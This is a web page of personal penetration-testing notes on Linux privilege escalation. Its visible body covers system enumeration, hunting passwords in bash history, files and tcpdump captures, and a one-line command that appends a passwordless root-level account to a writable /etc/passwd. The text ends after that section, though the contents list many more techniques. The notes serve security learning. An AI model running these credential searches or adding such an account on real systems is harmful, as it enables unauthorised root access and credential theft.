<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content=0x5h1n0k0><link href=https://0x5h1n0k0.github.io/notes/privilege-escalation/linux/ rel=canonical><link rel=icon href=../../../assets/favicon.png><meta name=generator content="mkdocs-1.5.2, mkdocs-material-8.3.9"><title>Linux Privilege Escalation | 0x5h1n0k0</title><link rel=stylesheet href=../../../assets/stylesheets/main.1d29e8d0.min.css><link rel=stylesheet href=../../../assets/stylesheets/cur.css><link rel=stylesheet href=../../../assets/stylesheets/footer.scss><link rel=stylesheet href=../../../assets/stylesheets/palette.cbb835fc.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Fira+Sans:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Fira Sans";--md-code-font:"Fira Code"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-XXXXXXXXXX"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-XXXXXXXXXX",{page_path:e.pathname})})})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script><link rel=stylesheet href=../../../overrides/assets/stylesheets/main.82a244a8.min.css><!-- live 2d --><link href=https://r18-nmsl.cn/pio/pio.css rel=stylesheet type=text/css><!-- <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script> --></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#linux-privilege-escalation class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../../.. title=0x5h1n0k0 class="md-header__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 0x5h1n0k0 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Linux Privilege Escalation </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=slate data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> <input class=md-option data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title=0x5h1n0k0 class="md-nav__button md-logo" aria-label=0x5h1n0k0 data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 3 1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"></path></svg> </a> 0x5h1n0k0 </label> <div class=md-nav__source> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> 0x5h1n0k0/0x5h1n0k0.github.io <ul class=md-source__facts> </ul> </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1 checked> <label class=md-nav__link for=__nav_1> PINNED <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=PINNED data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> PINNED </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_1 type=checkbox id=__nav_1_1 checked> <label class=md-nav__link for=__nav_1_1> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=2> <label class=md-nav__title for=__nav_1_1> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Linux Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Linux Privilege Escalation </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#privilege-escalation-methods class=md-nav__link> Privilege Escalation Methods </a> </li> <li class=md-nav__item> <a href=#basic-system-enumeration class=md-nav__link> Basic System Enumeration </a> </li> <li class=md-nav__item> <a href=#bash-history class=md-nav__link> Bash History </a> </li> <li class=md-nav__item> <a href=#openvpn-credentials class=md-nav__link> OpenVPN Credentials </a> </li> <li class=md-nav__item> <a href=#credentials-in-tcpdump-files class=md-nav__link> Credentials in tcpdump files </a> </li> <li class=md-nav__item> <a href=#writable-password-files class=md-nav__link> Writable Password Files </a> </li> <li class=md-nav__item> <a href=#kernel-expliots class=md-nav__link> Kernel Expliots </a> </li> <li class=md-nav__item> <a href=#sudo-l class=md-nav__link> Sudo -l </a> <nav class=md-nav aria-label="Sudo -l"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#absuing-sudo-binaries-to-gain-root class=md-nav__link> Absuing Sudo binaries to gain root </a> </li> <li class=md-nav__item> <a href=#sudo-cve class=md-nav__link> Sudo CVE </a> <nav class=md-nav aria-label="Sudo CVE"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cve-2019-14287 class=md-nav__link> CVE-2019-14287 </a> </li> <li class=md-nav__item> <a href=#cve-2019-16634 class=md-nav__link> CVE-2019-16634 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#sudo-ld_preload class=md-nav__link> Sudo LD_PRELOAD </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#suid-guid-binaries-overview class=md-nav__link> SUID / GUID Binaries Overview </a> </li> <li class=md-nav__item> <a href=#suid-path-environmental-variable class=md-nav__link> SUID PATH Environmental Variable </a> </li> <li class=md-nav__item> <a href=#cron-tabs-scheduled-tasks class=md-nav__link> Cron Tabs &amp; Scheduled Tasks </a> </li> <li class=md-nav__item> <a href=#capabilities class=md-nav__link> Capabilities </a> </li> <li class=md-nav__item> <a href=#nfs-root-squashing class=md-nav__link> NFS Root Squashing </a> </li> <li class=md-nav__item> <a href=#chkrootkit-049 class=md-nav__link> chkrootkit 0.49 </a> </li> <li class=md-nav__item> <a href=#tmux class=md-nav__link> Tmux </a> </li> <li class=md-nav__item> <a href=#mysql-running-as-root class=md-nav__link> MySQL Running as root </a> </li> <li class=md-nav__item> <a href=#mysql-udf-user-defined-functions-code-udf-injection class=md-nav__link> MySQL UDF (User-Defined Functions) Code (UDF) Injection </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../windows/ class=md-nav__link> Windows Privilege Escalation </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Try Hack Me <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Try Hack Me" data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Try Hack Me </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1 type=checkbox id=__nav_2_1> <label class=md-nav__link for=__nav_2_1> Learning Paths <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Learning Paths" data-md-level=2> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> Learning Paths </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1 type=checkbox id=__nav_2_1_1> <label class=md-nav__link for=__nav_2_1_1> Red Teaming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Teaming" data-md-level=3> <label class=md-nav__title for=__nav_2_1_1> <span class="md-nav__icon md-icon"></span> Red Teaming </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_1 type=checkbox id=__nav_2_1_1_1> <label class=md-nav__link for=__nav_2_1_1_1> Init Access <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Init Access" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_1> <span class="md-nav__icon md-icon"></span> Init Access </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tryhackme/red-teaming/init-access/red-team-weaponization/ class=md-nav__link> Weaponization </a> </li> <li class=md-nav__item> <a href=../../../tryhackme/red-teaming/init-access/password-attacks/ class=md-nav__link> Password Attacks </a> </li> <li class=md-nav__item> <a href=../../../tryhackme/red-teaming/init-access/phishing/ class=md-nav__link> Phishing </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_1_1_2 type=checkbox id=__nav_2_1_1_2> <label class=md-nav__link for=__nav_2_1_1_2> Post Compromise <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Post Compromise" data-md-level=4> <label class=md-nav__title for=__nav_2_1_1_2> <span class="md-nav__icon md-icon"></span> Post Compromise </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tryhackme/red-teaming/post-compromise/the-lay-of-the-land/ class=md-nav__link> The Lay of the Land </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Room <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Room data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Room </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../tryhackme/room/basic-pentesting/ class=md-nav__link> Basic Pentesting </a> </li> <li class=md-nav__item> <a href=../../../tryhackme/room/lianyu/ class=md-nav__link> Lian_Yu </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../tags/tags/ class=md-nav__link> Categories </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#privilege-escalation-methods class=md-nav__link> Privilege Escalation Methods </a> </li> <li class=md-nav__item> <a href=#basic-system-enumeration class=md-nav__link> Basic System Enumeration </a> </li> <li class=md-nav__item> <a href=#bash-history class=md-nav__link> Bash History </a> </li> <li class=md-nav__item> <a href=#openvpn-credentials class=md-nav__link> OpenVPN Credentials </a> </li> <li class=md-nav__item> <a href=#credentials-in-tcpdump-files class=md-nav__link> Credentials in tcpdump files </a> </li> <li class=md-nav__item> <a href=#writable-password-files class=md-nav__link> Writable Password Files </a> </li> <li class=md-nav__item> <a href=#kernel-expliots class=md-nav__link> Kernel Expliots </a> </li> <li class=md-nav__item> <a href=#sudo-l class=md-nav__link> Sudo -l </a> <nav class=md-nav aria-label="Sudo -l"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#absuing-sudo-binaries-to-gain-root class=md-nav__link> Absuing Sudo binaries to gain root </a> </li> <li class=md-nav__item> <a href=#sudo-cve class=md-nav__link> Sudo CVE </a> <nav class=md-nav aria-label="Sudo CVE"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cve-2019-14287 class=md-nav__link> CVE-2019-14287 </a> </li> <li class=md-nav__item> <a href=#cve-2019-16634 class=md-nav__link> CVE-2019-16634 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#sudo-ld_preload class=md-nav__link> Sudo LD_PRELOAD </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#suid-guid-binaries-overview class=md-nav__link> SUID / GUID Binaries Overview </a> </li> <li class=md-nav__item> <a href=#suid-path-environmental-variable class=md-nav__link> SUID PATH Environmental Variable </a> </li> <li class=md-nav__item> <a href=#cron-tabs-scheduled-tasks class=md-nav__link> Cron Tabs &amp; Scheduled Tasks </a> </li> <li class=md-nav__item> <a href=#capabilities class=md-nav__link> Capabilities </a> </li> <li class=md-nav__item> <a href=#nfs-root-squashing class=md-nav__link> NFS Root Squashing </a> </li> <li class=md-nav__item> <a href=#chkrootkit-049 class=md-nav__link> chkrootkit 0.49 </a> </li> <li class=md-nav__item> <a href=#tmux class=md-nav__link> Tmux </a> </li> <li class=md-nav__item> <a href=#mysql-running-as-root class=md-nav__link> MySQL Running as root </a> </li> <li class=md-nav__item> <a href=#mysql-udf-user-defined-functions-code-udf-injection class=md-nav__link> MySQL UDF (User-Defined Functions) Code (UDF) Injection </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <aside class=mdx-author> </aside> <div class=tags-items style="color: var(--md-default-fg-color--light); padding-bottom: 10px; opacity: 0.9">Tags</div> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/notes/privilege-escalation/linux/index.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4v-2m10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1 2.1 2.1Z"/></svg> </a> <a href=https://github.com/0x5h1n0k0/0x5h1n0k0.github.io/edit/master/docs/notes/privilege-escalation/linux/index.md title="View source of this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.15 8.15 0 0 1-1.23-2Z"/></svg> </a> <nav class=md-tags> <a href=../../../tags/tags/#privilege-escalation class=md-tag> Privilege Escalation </a> <a href=../../../tags/tags/#linux class=md-tag> Linux </a> </nav> <h1 id=linux-privilege-escalation><strong>Linux Privilege Escalation</strong><a class=headerlink href=#linux-privilege-escalation title="Permanent link">&para;</a></h1><p style="color:#bdbdbd"><i>Estimated time to read: 22 minutes</i></p>
 <hr> <h2 id=privilege-escalation-methods><strong>Privilege Escalation Methods</strong><a class=headerlink href=#privilege-escalation-methods title="Permanent link">&para;</a></h2> <ul> <li>Basic System Enumeration</li> <li>Bash History</li> <li>OpenVPN Credentials</li> <li>Credentials in tcpdump files</li> <li>Writable Files</li> <li>SSH Private Keys </li> <li>Kernel Expliots</li> <li>Sudo -l </li> <li>Sudo CVE </li> <li>Sudo LD_PRELOAD</li> <li>SUID / GUID Binaries</li> <li>SUID PATH Environmental Variable</li> <li>Cron Tabs &amp; Scheduled Tasks</li> <li>Capabilities (Python - Perl - Tar - OpenSSL)</li> <li>NFS Root Squashing</li> <li>chkrootkit 0.49</li> <li>Tmux (Attach Session)</li> <li>Screen (Attach Session)</li> <li>MySQL Running as root</li> <li>MySQL UDF (User-Defined Functions) Code (UDF) Injection</li> </ul> <h2 id=basic-system-enumeration><strong>Basic System Enumeration</strong><a class=headerlink href=#basic-system-enumeration title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=n>uname</span> <span class=n>-a</span> 
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a><span class=n>hostname</span> 
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a><span class=n>lscpu</span> 
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a><span class=nb>ls </span><span class=p>/</span><span class=n>home</span> 
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=nb>ls </span><span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span><span class=n>html</span> 
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a><span class=nb>ls </span><span class=p>/</span><span class=n>var</span><span class=p>/</span><span class=n>www</span><span class=p>/</span>
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a><span class=nb>ps </span><span class=n>aux</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>root</span> 
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a><span class=n>netstat</span> <span class=n>-tulpn</span> 
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a><span class=nb>ps </span><span class=n>-aux</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>root</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>mysql</span>
<a id=__codelineno-0-10 name=__codelineno-0-10 href=#__codelineno-0-10></a><span class=n>ifconfig</span> 
<a id=__codelineno-0-11 name=__codelineno-0-11 href=#__codelineno-0-11></a><span class=n>find</span> <span class=p>.</span> <span class=n>-type</span> <span class=n>f</span> <span class=n>-exec</span> <span class=n>grep</span> <span class=n>-i</span> <span class=n>-I</span> <span class=s2>&quot;PASSWORD=&quot;</span> <span class=p>{}</span> <span class=p>/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>\;</span>
<a id=__codelineno-0-12 name=__codelineno-0-12 href=#__codelineno-0-12></a><span class=n>locate</span> <span class=n>pass</span> <span class=p>|</span> <span class=n>more</span>
</code></pre></div> <h2 id=bash-history><strong>Bash History</strong><a class=headerlink href=#bash-history title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a><span class=nb>history </span>                           
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a><span class=nb>cat </span><span class=p>/</span><span class=n>home</span><span class=p>/&lt;</span><span class=n>user</span><span class=p>&gt;/.</span><span class=n>bash_history</span>     
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a><span class=nb>cat </span><span class=p>~/.</span><span class=n>bash_history</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>-i</span> <span class=n>passw</span> 
</code></pre></div> <h2 id=openvpn-credentials><strong>OpenVPN Credentials</strong><a class=headerlink href=#openvpn-credentials title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a><span class=n>locate</span> <span class=p>*.</span><span class=n>ovpn</span>                       
</code></pre></div> <h2 id=credentials-in-tcpdump-files><strong>Credentials in tcpdump files</strong><a class=headerlink href=#credentials-in-tcpdump-files title="Permanent link">&para;</a></h2> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a><span class=n>tcpdump</span> <span class=n>-nt</span> <span class=n>-r</span> <span class=n>capture</span><span class=p>.</span><span class=n>pcap</span> <span class=n>-A</span> <span class=n>2</span><span class=p>&gt;/</span><span class=n>dev</span><span class=p>/</span><span class=n>null</span> <span class=p>|</span> <span class=n>grep</span> <span class=n>-P</span> <span class=s1>&#39;pwd=&#39;</span>                    
</code></pre></div> <h2 id=writable-password-files><strong>Writable Password Files</strong><a class=headerlink href=#writable-password-files title="Permanent link">&para;</a></h2> <p>If you have write permission to the following files:</p> <ul> <li>/etc/passwd</li> <li>/etc/shadow</li> <li>/etc/sudoers</li> </ul> <p>With /etc/passwd <div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>   <span class=nb>echo </span><span class=s1>&#39;root2::0:0::/root:/bin/bash&#39;</span> <span class=p>&gt;&gt;</span> <span class=p>/</span><span class=n>etc</span><span class=p>/</span><span class=n>passwd</span>
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>   <span class=n>su</span> <span class=p>-</span> <span class=n>root2</span>
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>   <span class=n>id</span> <span class=p>&amp;&amp;</span> <span class=n>whoami</span>
<a id=__codelineno-4-4 name=__codelineno-4-4 href=#__codelineno-4-4></a>
<a id=__codelineno-4-5 name=__codelineno-4-5 href=#__codelineno-4-5></a><span class=p>//</span> <span class=n>Add</span> <span class=n>new</span> <span class=n>user</span> <span class=n>to</span> <span class=n>the</span> <span class=n>system</span> <span class=n>with</span> <span class=n>GID</span> <span class=n>and</span> <span class=n>UID</span> <span class=n>of</span> <span class=n>0</span>   
